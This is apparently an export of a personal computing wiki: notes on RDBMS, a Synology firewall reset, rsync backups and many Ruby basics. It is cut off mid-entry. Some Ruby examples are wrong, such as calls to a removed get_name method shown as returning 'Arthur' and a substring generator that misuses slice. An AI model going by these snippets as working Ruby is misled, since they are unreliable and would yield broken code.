<!-- Wikilinks: [[computing/software/relational-database-management-system]], [[software/relational-database-management-system]], [[relational-database-management-system]] -->

---
date: 2022-03-25T09:30
---

Relational DataBase Management System
=====================================

A Relational DataBase Management System or **RDBMS** is a software
application or system for managing relational databases. A RDBMS lets a
user (or application) to interact with a database by issuing *commands*
using a conventional or standardized syntax.

Examples of RDBMS includes [SQLite](https://www.sqlite.org/index.html),
[Microsoft SQL
Server](https://www.microsoft.com/en-us/sql-server/sql-server-downloads),
[[postgresql]]# and [MySQL](https://www.mysql.com/).

Every RDBMS varies in complexity and robustest, however they all have
the same underlying language in common: Structured Query Language (SQL).

NoSQL
-----

Non-relational data storage and retrieval models exist, such as
[MongoDB](https://www.mongodb.com/), which uses a document-oriented data
storage model.

[Source](https://launchschool.com/books/sql/read/introduction)


===

<!-- Source: computing/software/reset-synology-dsm-firewall.md -->
<!-- URL: /computing/software/reset-synology-dsm-firewall -->
<!-- Title: Reset Synology DSM Firewall -->
<!-- Wikilinks: [[computing/software/reset-synology-dsm-firewall]], [[software/reset-synology-dsm-firewall]], [[reset-synology-dsm-firewall]] -->

---
date: '2023-04-29T09:47:53JST'
---

# Reset Synology DSM Firewall

In some unknown circumstances that seems to be related to how much memory
the NAS has, Synology DSM's firewall become corrupted and just... stop?
To make matter worse, there is no indication of it working or not unless
you go check it out in the control panel.

This is a terrible security issue--specially to those who allow access
to their NAS from WAN--and there is no "official" way to restore
firewall to a known good state.

Fortunately, DSM has a `defaults` folder with default settings for DSM
services. We can use that to restore the firewall back to factory
setting. You do need to be able to `ssh` with admin account:

``` {.sh}
# Always take backups
mkdir backup
cp -a /usr/syno/etc/firewall.d ~/backup/
# Delete files in the folder
rm /usr/syno/etc/firewall.d/*.json

# Copy defaults settings
cp -a /usr/syno/etc.defaults/firewall.d /usr/syno/etc/

# Reload the firewall (need sudo)
sudo synofirewall --reload
```

It's possible to do all that in less steps but better be safe than too
cocky when performing this kind of actions.

Log into DSM to check that the annoying *"Failed to load the profile
data"* does not show up when selecting a firewall profile. You can
probably import your old profile with `synofirewall --import $PROFILE_NAME` but if it is corrupted, it may be better to just rewrite
a new one from scratch on the DSM interface.

[Source](https://old.reddit.com/r/synology/comments/z5gwph/reset_firewall_settings/jf7gm45/)


===

<!-- Source: computing/software/rsync-backup.md -->
<!-- URL: /computing/software/rsync-backup -->
<!-- Title: rsync でバックアップを作成する -->
<!-- Wikilinks: [[computing/software/rsync-backup]], [[software/rsync-backup]], [[rsync-backup]] -->

---
date: 2020-08-10
tags:
  - command
---

# rsync でバックアップを作成する

{.ui .info .message}
下記コマンドは macOS に適しています。他の UNIX
系の場合はフラグを合わせてお使いください。

バックアップする方法は山ほどありますが、やはり `rsync` は一番だと思います。

下記のコマンドによくお世話になっています。

```sh
rsync -vaE --progress --delete-after /Volumes/SourceName /Volumes/DestinationName
```

[詳細](https://apple.stackexchange.com/a/224772)


===

<!-- Source: computing/software/ruby.md -->
<!-- URL: /computing/software/ruby -->
<!-- Title: Ruby -->
<!-- Wikilinks: [[computing/software/ruby]], [[software/ruby]], [[ruby]] -->

---
date: 2020-08-02
---

# Ruby

I started learning Ruby in 2020 with [Launch
School](https://launchschool.com/).

## Portals

* [[learning-tracks]]#
* [[split-string-into-characters]]#
* [[ruby-pass-by-reference-of-the-value]]#
* [[inject-reduce-method]]#
* [[debugging-with-pry]]#
* [[rubocop]]#
* [[ruby-splat-operator]]#
* [[ruby-parallel-assignment]]#
* [[ruby-case-statement-without-comparison-value]]#
* [[calling-zip-with-block]]#
* [[search-replace-ruby]]#
* [[return-last-n-digits-ruby]]#
* [[infinity-in-ruby]]#
* [[difference-loop-each-ruby]]#
* [[generating-list-substrings]]#
* [[implicit-return-value]]#
* [[type-of-variables]]#
* [[ruby-exceptions]]#
* [[getter-setter-methods-ruby]]#
* [[classes-and-objects]]#
* [[fake-operators-equality]]#
* [[blocks-in-ruby]]#
* [[ruby-proc-and-scope]]#
* [[ruby-symbol]]#
* [[testing-with-ruby]]#
* [[heredoc-ruby]]#
* [[ruby-static-method]]#
* [[rbenv-versions-gems]]#
* [[ruby-array-any]]
* [[ruby-array-any]]#
* [[ruby-case-one-liner]]#
* [[ruby-comparable]]#
* [[ruby-difference-sort-sort-by]]#
* [[ruby-gets-chomp]]#
* [[ruby-kernel-format]]#
* [[ruby-new-class]]#
* [[ruby-string-casecmp]]#
* [[ruby-string-center]]#
* [[ruby-string-delete-count]]#
* [[ruby-string-gsub]]#
* [[ruby-substrings]]#
* [[ruby-syntactical-sugar-pitfalls]]#
* [[ruby-ternary-operator]]#
* [[method-lookup-path]]#
* [[method-with-block-at-invocation]]#
* [[modules]]#
* [[part-of-code-block-or-not]]#
* [[polymorphism]]#
* [[puts-return]]#
* [[what-is-self-ruby]]#
* [[while-until-for-loop]]#


===

<!-- Source: computing/software/ruby/blocks-in-ruby.md -->
<!-- URL: /computing/software/ruby/blocks-in-ruby -->
<!-- Title: Blocks in Ruby -->
<!-- Wikilinks: [[computing/software/ruby/blocks-in-ruby]], [[software/ruby/blocks-in-ruby]], [[ruby/blocks-in-ruby]], [[blocks-in-ruby]] -->

---
date: 2021-06-10T08:37
---

# Blocks in Ruby

Blocks are one way to achieve [[closure]]# in Ruby. We can think of block
as an anonymous method that is passed around and executed. And just like
method, blocks return a value.

In Ruby, method implicitly accepts blocks. The execution of the block is
done through [[yielding]]#.

## Arity

Passing less or more block argument than expected parameter does not
produce an error.

The rules regarding this number of arguments that can be passed to a block
(or a `Proc` or `lambda`) is called its **arity**. In Ruby, blocks have
_lenient arity_ rules. It means it won't complain if the number of
arguments is not the same as the number of parameters defined.

## When to use Blocks in a Method

### Defere the Implementation to Method Invocation

In some case, we are not sure how the method will be called. In those case,
instead of implementing a method with perhaps a flag to control the flow,
one can make use of a block. This is actually how most core library's
methods are implemented: `Array#select` lets you pass in any expression
that evaluates to a boolean in the block parameter. This is much more
convenient than having a `select_*` method for every case possible (one
when the number is _odds_, one when the number is _greater than_, one when
it's _prime_ etc.)

### Sandwich Code 🥪

Useful to execute a code before and after anything. Sandwich code is often
used with timing execution, logging, notification systems etc. It is also
used in resource management and interfacing with operating system: allocate
resources then perform clean-up to free up said resources.

```ruby
def time_it
  time_before = Time.now
  yield
  time_after = Time.now

  puts "It took #{time_after - time_before} seconds."
end

time_it { sleep(3) }

time_it { "hello world" }
```

Ruby's own `File#open` method can take a block. Doing so let the method
open then close a file automatically for us!

```ruby
File.open('file.txt', 'w+') do |file|
  # write something in the file
end
```

Here, Ruby automatically opens the file, do whatever we instruct it to do
in the block and finally closes the file. This is better than having to
call `File#close`!

## Explicit Block Parameter

Ruby methods implicitly accept block. If there is no yielding done, the
block is simply ignored. It is also possible to explicitly take a block.

An explicit block is treated **as a named object**: it gets assigned to a
method parameter and can be managed like any other object.

An explicit block is named with a `&` following by the name.

```ruby
def method(&explicit_block)
  puts "My &explicit_block is: #{explicit_block}"
end

method { sleep(2) }
# My &explicit_block is: #<Proc:0x000055d1e7dcf050 block.rb:5>
# => nil
```

The `explicit_block` local variable pointing to our explicit block is
converted by Ruby to a simple `Proc` object. The details of what is a
`Proc` is trifling as of yet but knowing it is a `Proc` is important for
invoking it further down the road with `Proc#call` method (see below).

{.ui .message .info}
Method with an explicit block are defined with a special parameter starting
with an `&` but it is dropped when referring to the parameter inside the
method.

The point of an explicit block is to be able to use it like any other
variable. That means we can pass the block around to another method, if
need arises.

```ruby
def method(&block)
  puts "Do something..."
  method2(block)         # Call `method2` passing in local variable `block`
  puts "Goodbye"
end

def method2(local_var)
  puts "In method2!"
  local_var.call("=> ")  # calls the block originally passed to `method`
  puts "Let's go back to method"
end

method do |prefix|
  puts prefix + "Wait 2 seconds and continue..."
  sleep(2)
end
# Do something...
# In method2!
# => Wait 2 seconds and continue...
# Let's go back to method
# Goodbye
```

A `Proc` is not called with `yield` like the implicit block we saw earlier.
Instead, to call a `Proc` we use the aptly named `call` method. Another
thing to keep in mind is that we can pass arguments to the explicit block
by using them as arguments to `call`. The argument is used only if a
parameter is defined in the block.


===

<!-- Source: computing/software/ruby/calling-zip-with-block.md -->
<!-- URL: /computing/software/ruby/calling-zip-with-block -->
<!-- Title: Calling zip with a block -->
<!-- Wikilinks: [[computing/software/ruby/calling-zip-with-block]], [[software/ruby/calling-zip-with-block]], [[ruby/calling-zip-with-block]], [[calling-zip-with-block]] -->

---
date: 2020-08-21T22:51
tags:
  - ruby
---

# Calling zip with a block

The [Ruby Doc for
`#zip`](https://ruby-doc.org/core-2.7.0/Array.html#method-i-zip) states:

```ruby
zip(arg, ...) {|arr| block} → nil 
```

In other words, calling `#zip` with a block always return nil. Without block,
it returns the result.

To use the result of `zip`, better pass it to somethig like `#map`:

```ruby
a = [1, 2, 3]
b = [4 ,5 ,6]

a.zip(b)                          # => [[1, 4], [2, 5], [3, 6]]
a.zip(b) {|n| n.reduce(:*) }      # => nil
a.zip(b).map {|n| n.reduce(:*) }  # => [4, 10, 18]
```


===

<!-- Source: computing/software/ruby/classes-and-objects.md -->
<!-- URL: /computing/software/ruby/classes-and-objects -->
<!-- Title: Classes and Objects -->
<!-- Wikilinks: [[computing/software/ruby/classes-and-objects]], [[software/ruby/classes-and-objects]], [[ruby/classes-and-objects]], [[classes-and-objects]] -->

---
date: 2021-05-17T21:51
---

# Classes and Objects

In Ruby, (almost) everything is an object. It is possible to make your own
object by defining their class.

```ruby
class MyClass
end

my_class = MyClass.new
```

Objects' **attributes** and **behaviors** are defined in classes. In other
words, classes are the basic _outlines_ of what an object should be **made
of** and what it should be **able to do**.

Attributes of an object are tracked by its **states** while **behaviors**
are what objects are capable of doing.

This is done by the mean of _instance variables_ and _instance methods_.
The former keep track of state and the later keep track of behavior for
objects.

```ruby
class Creature
  def initialize(name)
    @name = name
  end

  def say_name
    puts "My name is #{@name}!"
  end
end

monster = Creature.new('Granork')
monster.say_name  # => My name is Granork
```

In the example above, the state of the object `monster`, i.e. its name, is
saved in the instance variable `@name`. Its behavior, here the ability to
say its name, is rendered possible by the `say_name` instance method.

See also [[instance-methods-vs-class-methods]].


===

<!-- Source: computing/software/ruby/debugging-with-pry.md -->
<!-- URL: /computing/software/ruby/debugging-with-pry -->
<!-- Title: Debugging with Pry -->
<!-- Wikilinks: [[computing/software/ruby/debugging-with-pry]], [[software/ruby/debugging-with-pry]], [[ruby/debugging-with-pry]], [[debugging-with-pry]] -->

---
date: 2020-08-11
tags:
  - programming
  - debugging
---

# Debugging with Pry

## Quick Definition

Bugs = human errors in code

Debugging is the process of identifying and fixing those errors.


## Debugging Steps

Essentially can be resumed in three steps:

1. Identify the problem
2. Understand the problem
3. Implement a solution


### Types of Error

#### Syntax Errors

* Missing characters
* Misspelled keywords

Syntax errors generally stops code execution because the language doesn't know
how to interpret the code.


Example: 

```ruby
a = true

if a
  puts 'It's true!' # syntax error
end
```


#### Logical Errors

* Errors in the logic of the code

Code can run but most probably produces unexpected results or miss some steps.


Example:

```ruby
puts "Please pick an option: 1 or 2"
user_input = gets.chomp

if user_input == 1
  puts "You picked option 1"
elsif user_input == 2
  puts "You picked option 2"
else
  puts "Invalid option!!"
end
```

We could probably use a combination of `puts` to check results at each steps and
debug our code, but let's try with `pry` instead (see [Debugging with Pry](#debugging-with-pry-1)).


## What is Pry?

Pry is a Ruby gem which can be installed with `gem install pry`.

At a basic level, Pry is a REPL: **R**ead-**E**valuate-**P**rint **L**oop.
It's the name of an interactive environment that:

1. Read user input
2. Evaluates the input
3. Print the results to the user
4. Loops back to the start


{.ui .info .message}
IRB is also a REPL. Pry is like an advanced IRB for debugging.


## Using Pry

Pry lets you move around different contexts and see which methods you can call
on the current context.

For example, creating an array and `cd` into it, then calling `ls` will show
every methods that can be used on the array:

```ruby
[1] pry(main)> arr = [1, 2, 3]
=> [1, 2, 3]
[2] pry(main)> cd arr
[3] pry(#<Array>):1> ls
Enumerable#methods: 
  chain        collect_concat  each_entry       each_with_object  find      grep      inject  member?    partition    slice_before  tally 
  chunk        detect          each_slice       entries           find_all  grep_v    lazy    min_by     reduce       slice_when    to_set
  chunk_while  each_cons       each_with_index  filter_map        flat_map  group_by  max_by  minmax_by  slice_after  sort_by     
Array#methods: 
  &    all?           collect!     delete_at   eql?        hash          length  permutation         reject!               rotate!    slice       to_ary     zip
  *    any?           combination  delete_if   fetch       include?      map     pop                 repeated_combination  sample     slice!      to_h       |  
  +    append         compact      difference  fill        index         map!    prepend             repeated_permutation  select     sort        to_s     
  -    assoc          compact!     dig         filter      insert        max     pretty_print        replace               select!    sort!       transpose
  <<   at             concat       drop        filter!     inspect       min     pretty_print_cycle  reverse               shelljoin  sort_by!    union    
  <=>  bsearch        count        drop_while  find_index  intersection  minmax  product             reverse!              shift      sum         uniq     
  ==   bsearch_index  cycle        each        first       join          none?   push                reverse_each          shuffle    take        uniq!    
  []   clear          deconstruct  each_index  flatten     keep_if       one?    rassoc              rindex                shuffle!   take_while  unshift  
  []=  collect        delete       empty?      flatten!    last          pack    reject              rotate                size       to_a        values_at
self.methods: __pry__
locals: _  __  _dir_  _ex_  _file_  _in_  _out_  pry_instance
```

Inside the context, calling one of the method above will give the result of the
method:

```ruby
[4] pry(#<Array>):1> first
=> 1
```

It is also possible to show the doc for a particular method with `show-doc` and
the name of the method.


## Invoking Pry at Runtime

First of all, we need to add `require 'pry'` at the top of our file.

Then, we need to add `binding.pry` somewhere in our code where we want it
to stop in order to study it.

This is a good time to define **binding**: binding is the act of associating
properties with names. The binding process might be determined at different
phases of the life cycle of a program, but in our case we will scope it to the
state of the program at time of execution.

When the program reaches `binding.pry`, Pry interrupts the program execution
and _pries open_[^1] the binding of our variables so that we can take a look
around.


### Gotchas

We can place `binding.pry` wherever we want in our code but this may have
unforseen consequences on the output of our code. For example, placing
`binding.pry` on the last line of some method like `#map` will have the side
effect of returning `nil`.

```ruby
require "pry"

arr = [1, 2, 3].map do |n|
  n * 2
  binding.pry # returns nil
end

p arr # [nil, nil, nil]
```

## Debugging with Pry

Let's add `require 'pry'` and `binding.pry` to our bugged code:

```ruby
require "pry"

puts "Please pick an option: 1 or 2"
user_input = gets.chomp

binding.pry

if user_input == 1
  puts "You picked option 1"
elsif user_input == 2
  puts "You picked option 2"
else
  puts "Invalid option!!"
end
```

When running the code above, the execution will stop at `binding.pry`. From
here we can call arguments and use methods at our convenience.

```ruby
     1: require 'pry'
     2: 
     3: puts "Please pick an option: 1 or 2"
     4: user_input = gets.chomp
     5: 
 =>  6: binding.pry
     7: 
     8: if user_input == 1
     9:   puts "You picked option 1"
    10: elsif user_input == 2
    11:   puts "You picked option 2"

[1] pry(main)> user_input
=> "1"
[2] pry(main)> user_input == 1
=> false
```

Obviously the problem here is we are comparing a string with an integer.

To solve this bug we can either convert `user_input` to an integer or replace
integers with strings in the comparison statements.


## Stepping through Code with pry-byebug

`pry-byebug` extends `pry` with additional commands such as:
* `next`
* `step`
* `continue`

Other gems which extends `pry` exist, such as `pry-nav` and `pry-debugger`.

Just as with `pry`, we need to add `require "pry-byebug"` at the top of our
code.


## Cheatsheets

<table class="ui celled table">
  <thead>
    <tr>
      <th>Command</th>
      <th>Effect</th>
    </tr>
  </thead>
    <tbody>
      <tr>
        <td data-label="Command">cd</td>
        <td data-label="Effect">Change context</td>
      </tr>
      <tr>
        <td data-label="Command">ls</td>
        <td data-label="Effect">Show info</td>
      </tr>
      <tr>
        <td data-label="Command">show-doc</td>
        <td data-label="Effect">Show doc of the method it is called upon</td>
      </tr>
      <tr>
        <td data-label="Command">whereami</td>
        <td data-label="Effect">Show context. Can take an integer argument to show n lines above and below</td>
      </tr>
      <tr>
        <td data-label="Command">exit-program</td>
        <td data-label="Effect">Exit program (not just the loop)</td>
      </tr>
      <tr>
        <td data-label="Command">Ctrl + D</td>
        <td data-label="Effect">Jump to next line</td>
      </tr>
    </tbody>
</table>


[^1]: This is awkward but it's at this right moment I realize the name of the `pry` gem comes from the verb [to pry](https://www.merriam-webster.com/dictionary/pry).


===

<!-- Source: computing/software/ruby/difference-loop-each-ruby.md -->
<!-- URL: /computing/software/ruby/difference-loop-each-ruby -->
<!-- Title: Difference between loop and each in Ruby -->
<!-- Wikilinks: [[computing/software/ruby/difference-loop-each-ruby]], [[software/ruby/difference-loop-each-ruby]], [[ruby/difference-loop-each-ruby]], [[difference-loop-each-ruby]] -->

---
date: 2020-09-28T09:46
---

# Difference between loop and each in Ruby

A subtle difference to be aware of when using `loop` and/or `each` in Ruby.
Each time I will use the result of the snippet when passed in `irb`.


## loop

```ruby
array = (1..5).to_a

index = 0

loop do
  puts array[index]
  index += 1
  break if index == array.size
end
```

Results:

```ruby
1
2
3
4
5
=> nil
```

## each

```ruby
array = (1..5).to_a

array.each do |number|
  puts number
end
```

Results:

```ruby
1
2
3
4
5
=> [1, 2, 3, 4, 5]
```

The difference of course is `each` has a return value while `loop` does not.
Most of the time it won't matter but this is a common pitfals to be aware of.



===

<!-- Source: computing/software/ruby/fake-operators-equality.md -->
<!-- URL: /computing/software/ruby/fake-operators-equality -->
<!-- Title: Fake Operators and Equality -->
<!-- Wikilinks: [[computing/software/ruby/fake-operators-equality]], [[software/ruby/fake-operators-equality]], [[ruby/fake-operators-equality]], [[fake-operators-equality]] -->

---
Date: 2021-05-18T20:50
---

# Fake Operators and Equality

In Ruby, most operators are actually methods:

```ruby
1 + 3
# is actually...
1.+(3)

4 == 4
# is actually...
4.==(4)
```

This is true for the operators bellow:

<table class="ui celled table">
  <thead>
    <tr>
      <th>Operators</th>
      <th>Description</th>
     </tr>
  </thead>
  <tbody>
    <tr>
      <td data-label="Operators">`[]`, `[]=`</td>
      <td data-label="Description">Collection element getter/setter</td>
    </tr>
    <tr>
      <td data-label="Operators">`**`</td>
      <td data-label="Description">Exponential operator</td>
    </tr>
    <tr>
      <td data-label="Operators">`!`, `~`, `+`, `-`</td>
      <td data-label="Description">Not, complement, unary plus and minus</td>
    </tr>
    <tr>
      <td data-label="Operators">`*`, `/`, `%`</td>
      <td data-label="Description">Multiply, divide, and modulo</td>
    </tr>
    <tr>
      <td data-label="Operators">`+`, `-`</td>
      <td data-label="Description">Plus, minus</td>
    </tr>
    <tr>
      <td data-label="Operators">`>>`, `<<`</td>
      <td data-label="Description">Right and left shift</td>
    </tr>
    <tr>
      <td data-label="Operators">`&`</td>
      <td data-label="Description">Bitwise "and"</td>
    </tr>
    <tr>
      <td data-label="Operators">`^`, `|`</td>
      <td data-label="Description">Bitwise exclusive and inclusive "or" </td>
    </tr>
    <tr>
      <td data-label="Operators">`<=`, `<`, `>`, `>=`</td>
      <td data-label="Description">Less than/equal to, etc</td>
    </tr>
    <tr>
      <td data-label="Operators">`<=>`, `==`, `===`, `!=`, `=~`, `!~`</td>
      <td data-label="Description">Equality and pattern matching</td>
    </tr>
  </tbody>
</table>

Operators that are, in fact, methods, can be defined in custom classes[^1]
to change their default behaviors. For example we could compare two
`Person` classes by their age. To do that, we could use the _greater than_
operator (`>`) between two instances:

```ruby
class Person
  def initialize(age)
    @age = age
  end

  def >(other_person)
    age > other_person.age
  end

  def ==(other_person)
    age == other_person.age
  end

  protected

  attr_reader :age
end

arthur = Person.new(44)
tommy  = Person.new(43)

arthur > tommy  # => true
arthur == tommy # => false
```
(Note the use of `protected` which is perfect for this use case.)

Now, defining `==` method gives us `!=`. This is not true for `>` though.

```ruby
arthur != tommy # => true
arthur < tommy  # => NoMethodError (undefined method `<' for...
```

If we know we are going to use a lot of comparison, we can include the
`Comparable` module to our class and define `<=>`. By doing this, we are
effectively defining all comparison methods.

```ruby
class Person
  include Comparable

  def initialize(age)
    @age = age
  end

  def <=>(other_person)
    age <=> other_person.age
  end

  protected

  attr_reader :age
end

arthur = Person.new(44)
tommy  = Person.new(43)

arthur > tommy  # => true
arthur < tommy  # => false
arthur == tommy # => false
```

---

For the sake of completeness, let's add that there are also operators which
are not methods (and thus, can't be defined):

<table class="ui celled table">
  <thead>
    <tr>
      <th>Operators</th>
      <th>Description</th>
     </tr>
  </thead>
  <tbody>
    <tr>
      <td data-label="Operators">`.`, `::`</td>
      <td data-label="Description">Method/constant resolution operators</td>
    </tr>
    <tr>
      <td data-label="Operators">`&&`</td>
      <td data-label="Description">Logical "and"</td>
    </tr>
    <tr>
      <td data-label="Operators">`||`</td>
      <td data-label="Description">Logical "or"</td>
    </tr>
    <tr>
      <td data-label="Operators">`..`, `...`</td>
      <td data-label="Description">Inclusive range, exclusive range</td>
    </tr>
    <tr>
      <td data-label="Operators">`?` `:`</td>
      <td data-label="Description">Ternary if-then-else</td>
    </tr>
    <tr>
      <td data-label="Operators">`=`, `%=`, `/=`, `-=`, `+=`, `|=`, `&=`,
        `>>=`, `<<=`, `*=`, `&&=`, `||=`, `**=`, `{`</td>
      <td data-label="Description">Assignment/shortcuts, block delimiter</td>
    </tr>
  </tbody>
</table>

[^1]: They can also be re-defined for default class. This is called Monkey Patching and is very dangerous, and thus, should be avoided for the time being.


===

<!-- Source: computing/software/ruby/generating-list-substrings.md -->
<!-- URL: /computing/software/ruby/generating-list-substrings -->
<!-- Title: Generating a List of Substrings -->
<!-- Wikilinks: [[computing/software/ruby/generating-list-substrings]], [[software/ruby/generating-list-substrings]], [[ruby/generating-list-substrings]], [[generating-list-substrings]] -->

---
date: 2020-10-03T17:49
---

# Generating a List of Substrings

Here is one way to generate a list of unique substrings from a string.

```ruby
def substrings_generator(string)
  substrings_list = []

  0.upto(string.size) do |start_index|
    (start_index + 1).upto(string.size) do |end_index|
      substrings_list << string.slice(start_index, end_index)
      substrings_list
    end
  end

  substrings_list.uniq
end
```



===

<!-- Source: computing/software/ruby/getter-setter-methods-ruby.md -->
<!-- URL: /computing/software/ruby/getter-setter-methods-ruby -->
<!-- Title: Getter/Setter Methods in Ruby -->
<!-- Wikilinks: [[computing/software/ruby/getter-setter-methods-ruby]], [[software/ruby/getter-setter-methods-ruby]], [[ruby/getter-setter-methods-ruby]], [[getter-setter-methods-ruby]] -->

---
date: 2021-05-06T14:12
---

# Getter/Setter Methods in Ruby

In Ruby and most programming language, it is not possible to call instance
variable directly. To access objects' attributes, one need to use _getter_
and _setter_ methods.

Getters and setters are instance methods that let you retreive and modify
instance variables.

```ruby
class Obake
  def initialize(name)
    @name = name
  end

  def get_name
    @name
  end

  def set_name=(new_name)
    @name = new_name
  end

  def speak
    puts "けけけけ"
  end
end

ghost = Obake.new('Casper')
puts ghost.get_name    # => Casper
ghost.set_name = 'Arthur'
puts ghost.get_name    # => Arthur
```

In most programming language, `get_*` and `set_*` is used as the method
name. In Ruby, by convention we use the variable name itself. Let's rewrite
the code above with Ruby's convention:

```ruby
class Obake
  def initialize(name)
    @name = name
  end

  def name
    @name
  end

  def name=(new_name)
    @name = new_name
  end

  def speak
    puts "けけけけ"
  end
end

ghost = Obake.new('Casper')
puts ghost.name        # => Casper
ghost.name = 'Arthur'
puts ghost.get_name    # => Arthur
```

## Attributes Accessor

Writting _getter_ and _setter_ methods takes a lot of room in our program
for a somewhat basic feature. With a lot of states, even a basic class can
take several hundreds lines.

Fortunately, Ruby has a built-in way to automatically create _getter_ and
_setter_ methods, using the **attr_accessor** method.

```ruby
class Obake
  attr_accessor :name

  def initialize(name)
    @name = name
  end

  def speak
    puts "けけけけ"
  end
end

ghost = Obake.new('Casper')
puts ghost.name        # => Casper
ghost.name = 'Arthur'
puts ghost.get_name    # => Arthur
```

There are three `attr_` methods:

- `attr_accessor` read & write
- `attr_reader` read only
- `attr_writer` write only

Instance variables are written like symboles with a `:`. Multiple variables
can be written separated by comma: `attr_reader :name, :age`.

## Setter Methods

`ghost.name = 'Arthur'` is a shorthand for `ghost.name=('Arthur')` where
`name=` (with `=`) is the method name and the string `'Arthur'` is the
argument passed to in to the method. However Ruby recognizes this is a
_setter_ method and let us use a more natural assignment syntax.

{.ui .message .warning}
In Ruby, setter methods **always return the argument that was passed in**,
even when you add an explicit return statement.

```ruby
class BankAccount
  # Rest of the code...
  def balance=(new_balance)
    if new_balance >= 0
      @balance = new_balance
      true
    else
      false
    end
  end
end
```

The `balance=` method above will always return its argument
(`new_balance`), even if the instance variable `@balance` is re-assigned or
not.


===

<!-- Source: computing/software/ruby/heredoc-ruby.md -->
<!-- URL: /computing/software/ruby/heredoc-ruby -->
<!-- Title: Heredoc with Ruby -->
<!-- Wikilinks: [[computing/software/ruby/heredoc-ruby]], [[software/ruby/heredoc-ruby]], [[ruby/heredoc-ruby]], [[heredoc-ruby]] -->

---
date: 2021-07-04T18:52
---

# Heredoc with Ruby

In Ruby, it is possible to use a #[[heredoc]] in order to write a multiline
strings.

This is done just like in Unix shells, with the important difference that
no space should come between the heredoc identifier and the double carret
(`<<`) because Ruby uses thoses as well.

```ruby
result = <<HEREDOC
First line
Second line
HEREDOC
```

The identifier (here, `HEREDOC`) can be whatever you want but all-uppercase
identifiers are generally used.

One inconvenience with heredoc is that, as they preserve spaces and
indentation, writting heredoc in Ruby can results in ugly and badly
indented code:

```ruby
class TicketMachine
  def error
    <<-HEREDOC
This ticket is #{travel_price} yens.
Please insert #{insufficient_funds} yens.
Thank you.
    HEREDOC
  end
end
```

{.ui .info .message}
`<<-` with a dash `-` lets you indent the closing heredoc identifier to the
same level as the opening one.

If we had indented our multiline strings correctly, the indentation would
have ben output _as is_, which is not what we want.

To have the message aligned against the left amrgin, we can use…

## The Squiggly Heredoc

Since Ruby 2.3, we have a new heredoc syntax called the **squiggly
heredoc**. Beside a funny name, it strips the leading whitespace in order
to let you write nicer code:

```ruby
class TicketMachine
  def error
    <<~HEREDOC
      This ticket is #{travel_price} yens.
      Please insert #{insufficient_funds} yens.
      Thank you.
    HEREDOC
  end
end
```

The only difference beside the now well indented multiline strings, is the
use of the **tilda**: `<<~`.

[Source](https://infinum.com/the-capsized-eight/multiline-strings-ruby-2-3-0-the-squiggly-heredoc)


===

<!-- Source: computing/software/ruby/implicit-return-value.md -->
<!-- URL: /computing/software/ruby/implicit-return-value -->
<!-- Title: Implicit Return Value of Method Invocations and Blocks -->
<!-- Wikilinks: [[computing/software/ruby/implicit-return-value]], [[software/ruby/implicit-return-value]], [[ruby/implicit-return-value]], [[implicit-return-value]] -->

---
date: 2021-01-11T12:24
---

# Implicit Return Value of Method Invocations and Blocks

Methods in Ruby implicitly returns their last line unless it's preceeded by an
explicit `return`.

```ruby
def random_method(str)
  str = 'new value'
end

new_str = random_method('first value')
puts '---------'
puts new_str
```

On the example above, `str = 'new value'` is implicitly returned.

This method would actually anger Rubocop because we are assigning a string to a
variable which will be returned anyway. We could (and should) directly return
the string.

```
2:3: W: Lint/UselessAssignment: Useless assignment to variable - str. (https://github.com/bbatsov/ruby-style-guide#underscore-unused-vars)
  str = 'new value'
  ^^^
```

The implicit return value is important because if not well understood it can be
the cause of a lot of problems down the road. Let's say for example we want to
output our new value:

```ruby
def random_method(str)
  str = 'new value'
  puts str
end

new_str = random_method('first value')
puts '---------'
puts new_str
```

One would think the code above outputs `new_value` two times. But it doesn't
because the method `random_method`'s last line is `puts str`. The method
`#puts` always returns `nil`, which is what `random_ method` returns as well.

It is possible to explicitly return a value using the `return` keyword.

```ruby
def random_method(str)
  return 'new value'
  str = 'newiest value'
end

new_str = random_method('first value')
puts '---------'
puts new_str
```

Here, `'new value'` is returned and the code after is not executed. It's aid to
b _unreachable_.

{.ui .info .message}
The rule of implicit return also apply to blocks.

This is most well illustrated by the [[collection-methods#select|`#select` method]]:

```ruby
(1..10).to_a.select do |num|
  num.odd?
end
# => [1, 3, 5, 7, 9]

(1..10).to_a.select do |num|
  puts num.odd?
end
# => []
```

Blocks also implicitely return the last statement (and the only one here).
`#select` check the return result of each block and add it to a new array if
the result evaluates to `true`. For the second range, the `#puts` method always
return `nil` which evaluates to `false`, which is why the new array is empty.



===

<!-- Source: computing/software/ruby/infinity-in-ruby.md -->
<!-- URL: /computing/software/ruby/infinity-in-ruby -->
<!-- Title: Infinity in Ruby -->
<!-- Wikilinks: [[computing/software/ruby/infinity-in-ruby]], [[software/ruby/infinity-in-ruby]], [[ruby/infinity-in-ruby]], [[infinity-in-ruby]] -->

---
date: 2020-08-24T23:23
tags:
  - ruby
---

# Infinity in Ruby

When dividing by zero, Ruby returns a `ZeroDivisionError (divided by 0)`.
However, when dividing by a zero using _float_, this time Ruby returns
`Infinity`.

```ruby
irb(main):001:0> 1 / 0
Traceback (most recent call last):
        5: from /usr/local/bin/irb:23:in `<main>'
        4: from /usr/local/bin/irb:23:in `load'
        3: from /var/lib/gems/2.7.0/gems/irb-1.2.4/exe/irb:11:in `<top (required)>'
        2: from (irb):1
        1: from (irb):1:in `/'
ZeroDivisionError (divided by 0)
irb(main):002:0> 1 / 0.0
=> Infinity
```

However, there is no constant named `Infinity` (you cannot call `Infinity`
directly). To call `Infinity`, one should use the constant `Float::INFINITY`.


## Not a Number (NaN)

Substracting or divising two infinite values returns NaN (Not a Number).

```ruby
irb(main):001:0> infinity = 1 / 0.0
irb(main):002:0> infinity - infinity
=> NaN
irb(main):003:0> infinity / infinity
=> NaN
irb(main):004:0> infinity * infinity
=> Infinity
```

## Source:

* [Infinity in Ruby](https://nithinbekal.com/posts/ruby-infinity/)


===

<!-- Source: computing/software/ruby/inject-reduce-method.md -->
<!-- URL: /computing/software/ruby/inject-reduce-method -->
<!-- Title: The inject and reduce Method -->
<!-- Wikilinks: [[computing/software/ruby/inject-reduce-method]], [[software/ruby/inject-reduce-method]], [[ruby/inject-reduce-method]], [[inject-reduce-method]] -->

---
date: 2020-08-10
tags:
  - ruby
---

# The inject and reduce Method

{.ui .info .message}
The `#inject` and `#reduce` methods are aliases. There is no performance
benefit to either. I will use `#reduce` below.

The doc for those two methods is a bit unclear, therfore an example is better
than thousands words.

Let's start with an example without argument to the `#reduce` method.

```ruby
